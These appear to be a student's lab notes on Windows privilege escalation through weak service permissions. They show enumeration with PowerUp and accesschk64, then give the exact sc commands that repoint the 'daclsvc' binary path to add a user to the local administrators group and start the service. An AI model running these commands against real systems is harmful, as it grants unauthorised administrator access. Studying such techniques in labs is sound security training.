**PowerUp**:
```PowerShell
Invoke-AllChecks
```

![[Pasted image 20240422093945.png]]

---

**accesschk64.exe**:
```cmd
accesschk64.exe -uwcv Everyone *
```
Args:
`-u`: Suppress errors
`-w`: Only show objects with write access
`-c`: Display service name
`-v`: Verbose
`Everyone`: Group name (containing every user) we check against

![[Pasted image 20240422094020.png]]

Query the service for information:
```cmd
sc qc daclsvc
```

![[Pasted image 20240422094306.png]]

Since we have **SERVICE_CHANGE_CONFIG** permissions we can change the binary path name, and then with **SERVICE_START** and **SERVICE_STOP** permissions we can restart the service and exploit it.

Set the binary path:
```cmd
sc config daclsvc binpath= "net localgroup administrators <username> /add"
```

Query the service again to confirm the change:
![[Pasted image 20240422094751.png]]

Start the service to run the exploit:
```cmd
sc start daclsvc
```